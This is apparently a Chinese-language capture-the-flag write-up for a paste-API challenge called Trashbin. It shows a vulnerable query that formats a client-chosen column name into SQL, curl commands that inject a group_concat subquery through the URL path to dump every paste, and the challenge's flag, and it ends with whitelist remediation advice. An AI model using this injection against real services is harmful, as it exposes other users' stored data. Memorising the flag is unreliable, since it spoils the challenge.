# Trashbin

## 题目简述

Trashbin 提供一个简易 Paste API。读取完整 Paste 时，`paste_id` 被正确地作为 SQLite 参数传入；但读取单个字段的接口 `/paste/<paste_id>/<field>` 允许客户端控制列名，后端直接把它拼进 SQL：

```python
result = self.execute_query(
    "SELECT {} FROM pastes WHERE id=?".format(field),
    (paste_id,),
)
```

参数化查询只保护了 `paste_id`，没有保护经 `str.format()` 拼接的 `field`。因此路径中的“字段名”实际是一个可控 SQL 表达式。

## 解题过程

接口在执行动态查询前先调用 `paste_exists(paste_id)`，所以必须准备一个真实存在的 Paste ID。先创建任意记录：

```bash
base=http://TARGET

response=$(curl -s -X POST \
  -H 'Content-Type: application/json' \
  -d '{"title":"test","text":"test"}' \
  "$base/paste/new")

paste_id=$(printf '%s' "$response" | jq -r '.url' | cut -d/ -f3)
```

正常访问 `/paste/<id>/title` 时，最终语句近似为：

```sql
SELECT title FROM pastes WHERE id=?
```

把 `field` 换成带括号的标量子查询：

```sql
(SELECT group_concat(text) FROM pastes)
```

最终语句变为：

```sql
SELECT (SELECT group_concat(text) FROM pastes) FROM pastes WHERE id=?
```

外层查询因有效的 `paste_id` 返回一行，内层子查询则把 `pastes` 表中所有正文连接起来。对路径中的空格进行 URL 编码即可直接提取：

```bash
curl -s \
  "$base/paste/$paste_id/(select%20group_concat(text)%20from%20pastes)" \
  | grep -o 'shellmates{[^}]*}'
```

输出为：

```text
shellmates{2021_y3t_sQl_1nj3ct10ns_4r3_st1ll_4_pr0bl3m}
```

这里不需要猜测固定 Paste ID，也不需要依赖 `DELETE` 接口中对某个 ID 的特殊保护；自行创建一条记录只是为了通过存在性检查。

## 方法总结

本题强调了参数化查询的边界：占位符只能代表值，不能安全代表列名、表名或 SQL 语法片段。只要结构位置仍由字符串格式化拼接，查询整体依然可注入。黑盒工具容易只测试常见的 query/body 参数，而忽略 REST 路径中伪装成资源属性的输入点。

若业务确实允许选择字段，应把外部名称映射到固定白名单，例如仅接受 `title` 和 `text`，再由程序选择预定义 SQL；不要把客户端字符串直接插入 `SELECT` 列表。
